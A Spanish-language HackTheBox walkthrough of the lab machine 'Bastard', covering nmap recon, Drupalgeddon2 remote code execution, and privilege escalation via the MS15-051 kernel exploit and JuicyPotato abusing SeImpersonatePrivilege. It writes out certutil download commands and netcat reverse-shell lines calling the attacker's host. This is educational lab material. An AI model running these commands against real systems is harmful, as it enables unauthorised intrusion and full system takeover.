---
layout      : post
title       : "HackTheBox - Bastard"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png
category    : [ htb ]
tags        : [ windows-privileges, drupal, drupalgeddon2, juicyPotato, kernel-exploit ]
---
Máquina Windows nivel medio, vamos a romper **Drupal 7.54** y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio **SeImpersonate** y de **JuicyPotato** o explotando el lindo **kernel**.

![7bastardHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bastardHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [ch4p (the creator)](https://www.hackthebox.eu/profile/1).

Inicialmente encontraremos el gestor de contenido `Drupal` en su versión `7.54` corriendo en el puerto **80**, investigando llegaremos a la vuln ya muy conocida `Drupalgeddon2`, aprovechándonos de algunos exploits lograremos ejecutar comandos en el sistema como el usuario `nt authority\iusr`. Generaremos una reverse Shell para estar más cómodos (y rápidos).

Estando ya en el sistema veremos dos maneras de escalar privilegios:

1. Usando un privilegio bastante llamativo: `SeImpersonate`, ya que existen varios exploits de la "familia patata" que se aprovechan de él.
2. Explotando el **kernel** de `Windows` 🥴

Lograremos explotarla de las dos maneras para finalmente conseguir una **Reverse Shell** como el usuario `nt authority\system` en el sistema (:

🌌 ***He creado un `autopwn` para automatizar toodo y mediante la explotación del privilegio conseguir una Shell como diosito. Lo único es que debes tener es el binario `nc.exe` y el binario `JuicyPotato.exe` en la misma ruta que el script:***

> [autopwn_bastard.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/bastard/autopwn_bastard.py)

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Vulns conocidas y apunta mucho a la realidad.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Movimientos guturalmente prurales.

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Encontramos al **CMS Drupal 7** corriendo sobre el puerto 80](#puerto-80).
3. [Explotación: jugamos con **Drupalgeddon2** para obtener **RCE**](#explotacion).
4. [Escalada de privilegios, subimos de dos maneras:](#escalada-de-privilegios)
  * [**MS15-051** - Vulnerabilities in Windows Kernel](#ms15-051).
  * [Aprovechándonos del privilegio **SeImpersonate**](#seimpersonate-juicy).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Como siempre vamos a empezar encontrando que puertos tiene expuestos la máquina, esto para encaminar nuestra ruta hacia la explotación. Jugaremos con `nmap` para esto:

```bash
❱ nmap -p- --open -v 10.10.10.9 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Pero este escaneo va baaaaaaastaaante lento, así que le agregamos el parámetro `--min-rate` para indicarle que en cada petición que haga no envíe menos de N paquetes, en nuestro caso `2000` paquetes:

📝 ***Es importante realizar el escaneo normal (sin parámetros de velocidad), ya que pueda que al ir tan rápido nos saltemos algún puerto***.

```bash
❱ nmap -p- --open -v --min-rate=2000 10.10.10.9 -oG initScan
```

El escaneo nos devuelve:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Mon Aug  9 25:25:25 2021 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10.10.10.9
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.9 ()	Status: Up
Host: 10.10.10.9 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///	Ignored State: filtered (65533)
# Nmap done at Mon Aug  9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71.42 seconds
```

Solo dos puertos:

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Un servidor web. |
| 135    | **[RPC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)**: Permite la comunicación entre computadoras sin necesidad de conocer detalles de la red. |

Ahora vamos a realizar un segundo escaneo, pero para encontrar que versiones y scripts tienen relación con cada puerto (servicio):

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno (en este caso no es relevante, pero bueno, en caso de tener muchos puertos es muy útil.**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.9
    [*] Open ports: 80,135

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 80,135 -sC -sV 10.10.10.9 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y este escaneo nos muestra:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Mon Aug  9 25:25:25 2021 as: nmap -p 80,135 -sC -sV -oN portScan 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.11s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  9 25:25:25 2021 -- 1 IP address (1 host up) scanned in 33.20 seconds
```

Pfff, variedad e.e

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Microsoft IIS httpd 7.5 |

Vemos el **CMS** `Drupal 7` y también varias rutas que `nmap` descubrió: (`includes/`, `misc/`...)

Listones, vainitas pa mirar, metámosle fuego!!

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien confirmamos el gestor de contenido [(CMS) Drupal](https://www.inboundcycle.com/blog-de-inbound-marketing/drupal-que-es-caracteristicas-y-funcionalidades) por el logo e.e, pero si quisiéramos corroborarlo al 100% podemos usar `whatweb`:

```bash
❱ whatweb http://10.10.10.9/
http://10.10.10.9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to 10.10.10.9 | 10.10.10.9], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
```

Destacamos tanto a `Drupal 7` como la versión del `PHP 5.3.28`.

📓 ***"Drupal es un CMS o sistema de gestión de contenidos que se utiliza para crear sitios web dinámicos y con gran variedad de funcionalidades."*** [drupal.groups](https://groups.drupal.org/node/148379).

Así que perrrrfecto, sigamos... 

Validando las rutas descubiertas por `nmap` todas las carpetas nos devuelven que no tenemos permitido ver su contenido :( peeeero leyendo el objeto `CHANGELOG.txt` encontramos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7page80_CHANGELOGtxt.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Es un log de los cambios que se han introducido en cada actualización, la última habla de la versión `7.54`, así que podemos pensar que nuestro servidor web tiene esa versión. Esto nos abre la puerta para buscar vulnerabilidades relacionadas con ella...

...

# Explotación [#](#explotacion) {#explotacion}

Encontramos varios recursos, entre ellos:

1. [Reporte hackerone - [CVE-2018-7600] Remote Code Execution due to outdated Drupal server](https://hackerone.com/reports/1063256).
2. [github.com/dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2).
3. [github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600).
4. [github.com/FireFart/CVE-2018-7600 - Acá se ve clarita la petición que logra la explotación](https://github.com/FireFart/CVE-2018-7600).

(*Todos los exploits funcionales*)

En el primer recurso se habla de una vulnerabilidad en el CMS **Drupal** la cual permite ejecutar comandos en el sistema:

📓 ***"Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations."*** [hackerone - chron0x](https://hackerone.com/reports/1063256)

En él hace referencia al segundo recurso de nuestra lista, que nos lleva a profundizar un poco sobre `Drupalgeddon2` (`CVE-2018-7600`)... Encontramos este gran post de **Vicente Motos** por parte de [hackplayers](https://www.hackplayers.com/2018/04/llega-drupalgeddon2-rce-inyectando-en-arrays.html) en el que explica de una manera suuuper sencilla la explotación, vayan y visítenlo.

* [¡Llega #Drupalgeddon2! RCE inyectando en arrays renderizables](https://www.hackplayers.com/2018/04/llega-drupalgeddon2-rce-inyectando-en-arrays.html).

Básicamente el problema se presenta por la NO sanitización de las solicitudes `AJAX` que viajan mediante el **Form API**, lo que permite la inyección de cositas locas en la estructura (en los arrays que renderiza el proceso). De nuevo, les recomiendo mucho leer el post de arriba, ta buenazo!

Perfecto, apoyados en esa explotación podemos lograr una ejecución remota de comandos yyyyyyyyyy esa es la finalidad de los 3 exploits referenciados antes. Jugaremos con el `2` el cual en caso de tener éxito nos devuelve una **Fake Shell** (simula que estamos en una terminal, pero no, solo esta ejecutando el comando, no nos podemos mover de directorio ni nada interactivo) en la que simplemente debemos pasar el comando y tendremos nuestra respuesta, pues intentemos:

Clonamos el repo y ejecutamos:

```bash
❱ ruby drupalgeddon2.rb 
Traceback (most recent call last):
        2: from drupalgeddon2.rb:16:in `<main>'
        1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
```

El error es de nuestro entorno, ya que no encuentra la librería `highline`, la instalamos:

```bash
❱ gem install highline
```

Yyyy:

```bash
❱ ruby drupalgeddon2.rb 
Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]
Example for target that does not require authentication:
       ruby drupalgeddon2.rb https://example.com
Example for target that does require authentication:
       ruby drupalgeddon2.rb https://example.com --authentication
```

Listos, ejecutémoslo contra el recurso:

```bash
❱ ruby drupalgeddon2.rb http://10.10.10.9
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_drupalgeddonRBexploit_rce1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, el programa nos indica que existe la vuln y tiene posibilidad de ejecutar comandos, después de eso hace unas pruebas para escribir un archivo en el sistema yyyyy finalmente obtenemos la **Fake Shell**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_drupalgeddonRBexploit_rce2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Liiiiistones, "tamos" en la máquina, pero medio feo estar en una **Fake Shell**, así que subamos el binario `nc.exe` y entablémonos una Reverse Shell:

Nos posicionamos en la ruta donde esté el binario y levantamos un servidor web:

```bash
❱ python3 -m http.server
```

Y ahora desde la **Fake** le decimos que busque en ese servidor web el archivo `nc.exe` y lo suba a nuestra ruta actual:

```bash
drupalgeddon2>> certutil.exe -f -urlcache -split http://10.10.14.8:8000/nc.exe nc.exe
```

Y ya tendríamos el binario en la máquina:

```powershell
drupalgeddon2>> dir
Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of C:\inetpub\drupal-7.54

...
10/08/2021  25:25             45.272 nc.exe
...
```

Ahora nos ponemos en escucha por algún puerto, en mi caso el `4433`:

```bash
❱ nc -lvp 4433
```

Y en la máquina víctima ejecutamos:

```bash
drupalgeddon2>> .\nc.exe 10.10.14.8 4433 -e cmd.exe
```

Donde le indicamos que envíe una petición a nuestro listener y una vez se entable la conexión nos ejecute `cmd.exe`, o sea una terminal **CMD**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_iusrRevSH_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y ya tenemos una Shell medio interactiva, digo medio, ya que si por cosas de la vida hacemos `CTRL + C` pues perderemos la terminal :( y no tenemos histórico :( x2

Pero bueno, ahora si estamos dentro del sistemaaaaaaaaaaaaaaaaaaaaaaa, sigamos...

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Encontré 2 rutas para lograr el privesc, les dejo los links de cada apartado:

* [**MS15-051** - Vulneramos el **kernel** del sistema](#ms15-051).
* [Aprovechándonos del privilegio **SeImpersonate**](#seimpersonate-juicy).

...

## Rompemos el Kernel de Windows (<u>MS15-051</u>) [📌](#ms15-051) {#ms15-051}

Si jugamos con `systeminfo` podemos (a veces) ver todo lo relacionado con el sistema operativo, como la arquitectura, la versión del SO y su nombre (otras cositas más), pues veamos que nos responde:

```powershell
C:\inetpub\drupal-7.54>systeminfo
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7cmd_iusrSH_systeminfo.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, para ahorrar tiempo y ojos, existen herramientas que toman toooooodo ese output de arriba y lo relacionan con bases de datos de exploits, esto para encontrar vulns relacionadas con la versión del SO. Una de ellas se llama [wesng](https://github.com/bitsadmin/wesng) y es la que usaremos, nos clonamos el repo, nos copiamos el contenido de `systeminfo` y lo pegamos en un archivo (lo llamaré **systeminfo.txt**) yy ejecutamos:

```bash
# Para que tome las ultimas vulns
❱ python3 wes.py --update
```

Y ahora le pasamos el archivo `systeminfo.txt` peeeero le indicamos que solo queremos ver vulns relacionadas con "escalar privilegios":

```bash
❱ python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
```

Y nos devuelve vaaaaaarias cositas, entre ellas 2 referencias a exploits contra el **Kernel**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_wesng_kernelExploits.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Solo nos queda explorar cada exploit y ver si algunos nos funciona...

Pero ninguna referencia nos ayudó (o a mí no me sirvieron 😟). Después de un rato buscando binarios y compilando otros, se me ocurrió simplemente buscar por el título de las vulns, o sea investigar sobre:

```txt
Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
```

De primeras encontramos dos cosas, una referencia al reporte `MS10-015` (pero abajo hay por ejemplo una hacia `MS10-021`, por lo que podemos pensar que es un grupo de vulns) y su definición, así que volvemos a buscar binarios que se relacionen...

Peeero nada. Probando, probando y probando cosas llegamos a este repo (que no sé cómo llegue, despues de varios links este fue el que me funciono 😄):

* [SecWiki/windows-kernel-exploits/MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051).

Nos descargamos el comprimido `MS15-051-KB3045171.zip`, lo descomprimimos, lo subimos a la máquina y probamos:

```powershell
C:\inetpub\drupal-7.54>.\ms15-051.exe
.\ms15-051.exe
[#] ms15-051 fixed by zcgonvh
[#] usage: ms15-051 command 
[#] eg: ms15-051 "whoami /all"
```

Bien es funcional e interactivo, pues ejecutemos un `whoami`:

```powershell
C:\inetpub\drupal-7.54>.\ms15-051.exe "whoami"
.\ms15-051.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1808 created.
==============================
nt authority\system
```

😲 apaaaa, somos `nt authority\system` :o poooooooo generémonos una **Reverse Shell** de unaaaaaaaaa:

```powershell
C:\inetpub\drupal-7.54>.\ms15-051.exe "c:\inetpub\drupal-7.54\nc.exe 10.10.14.8 4434 -e cmd.exe"
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_MS15_051_NTsystemSH_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perrrrrfectisiiiimo, conseguimos una Shell explotando el **kernel** de `Windows`, que lindura.

Antes de irnos veamos la otra manera de escalar...

...

## Explotamos el privilegio <u>SeImpersonatePrivilege</u> [📌](#seimpersonate-juicy) {#seimpersonate-juicy}

Si revisamos nuestros privilegios vemos 3:

```powershell
C:\inetpub\drupal-7.54>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Jugando con [esta lista](https://github.com/gtworek/Priv2Admin) de privilegios encontramos que `SeImpersonatePrivilege` es bastante llamativo porque nos permite crear un proceso como otro usuario del sistema 😮😮😮🤪 

Existen varias herramientas de la llamada `Potato Family` que explotan el privilegio, investigando un poco más llegamos a esta guía donde muestran el uso de una de ellas: `JuicyPotato.exe`:

* [Juicy Potato (abusing the golden privileges)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges).

Básicamente le pasamos el puerto en el que queremos que escuche el proceso, el programa que ejecutara, los argumentos (si los lleva), el **como** va a crear el proceso y (es opcional, pero después de probar cositas vemos que es necesario en este caso) un `CLSID` (un identificador de un objeto con el que queremos interactuar ([COM](https://docs.microsoft.com/en-us/windows/win32/com/com-class-objects-and-clsids))).

📓 ***"A COM server is implemented as a COM class. A COM class is an implementation of a group of interfaces in code executed whenever you interact with a given object."*** [docs.microsoft](https://docs.microsoft.com/en-us/windows/win32/com/com-class-objects-and-clsids).

Bien, pues si queremos intentar esa explotación ¿qué nos hace falta? Exacto, el binario, lo descargamos de acá:

* [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases).

Lo bajamos, le cambiamos el nombre a `jp.exe` (porque si 😬 y porque podemos (básicamente para no hacer mayus y que sea fácil de recordar)) y lo subimos a la máquina, una vez arriba al ejecutarlo deberíamos ver esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_iusrSH_jpEXE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Entonces, vamos a tomar este ejemplo y veamos que pasarle a cada parámetro:

```powershell
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\Users\User\reverse_shell.exe"
```

* `-l`:
  Dejaremos ese puerto por ahora.

* `-p`:
  Le diremos que también tome como programa la `cmd.exe` y que ella sea la que nos ejecute los argumentos (parámetro `-a`).

* `-t`:
  Le dejamos el mismo, así juega con las dos opciones que tiene y elige la que le funcione.

* `-c`:
  Para elegir el **identificador del objeto** debemos (para el caso de esta máquina) ir a este link (que nos lo provee el mismo post que venimos siguiendo):

  * [Windows Server 2008 R2 Enterprise - CLSIDs](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/).

  Tomamos alguno de la lista, yo seleccioné el primero:

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7google_selectCLSID.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

* `-a`:
  Y como argumentos le decimos que nos genere una nueva **Reverse Shell** pero hacia otro puerto:

  ```powershell
  -a "/c c:\inetpub\drupal-7.54\nc.exe 10.10.14.8 4434 -e cmd.exe"
  ```

Listos, tenemos todo, ahora si generemos nuestra línea:

```powershell
.\jp.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c c:\inetpub\drupal-7.54\nc.exe 10.10.14.8 4434 -e cmd.exe"
```

Antes de ejecutarlo, nos ponemos en escucha por el puerto `4434`:

```bash
❱ nc -lvp 4434
```

Yyyyyyyyyyyyyy ejecutaaaaaamooooooooooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_jpEXE_ntsystemRevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

SI SEEEEEEEÑOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOORA, estamos dentro de la máquina como el usuario `nt authority\system` después de haber ejecutado un proceso (como ese usuario (por el `CLSID`)) que generaba una Reverse Shell. Lindo lindo.

Y pues ya somos amos y señoras del sistema, veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Peeeeeeeerrrrrfectoooo. Como ítem final nos generamos un `autopwn` el cual nos brindara una Shell directamente como el usuario **NT authority\system** en el sistema, lo único que necesitamos es tener en la misma ruta del script tanto el binario `nc.exe` como el binario `JuicyPotato.exe`.

***(Claramente se puede mediante el `MS15-051.exe`, pero creo que puede ser un poquititititico complicado, ya que cuando lanzamos la revshell el programa se queda en escucha infinidad de tiempo. Tendríamos que controlar eso.)***

La ejecución del script sería sencilla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_scriptPY_autopwn_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y rápidamente tendríamos una Shell (:

> [autopwn_bastard.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/bastard/autopwn_bastard.py)

Y hemos terminao'

...

Linda máquina, el tema de **Drupalgeddon2** ya lo habíamos trabajado así que apenas lo vi pensé en esa vuln. El privesc me gusto bastante, primero porque lo hicimos de dos formas y segundo por el tema del **kernel**, muy lindo todo.

Y bueno, nos vamos, se cuidan y nos leeremos despues, como siempre a rooooooooooooooomper toooooodo!!!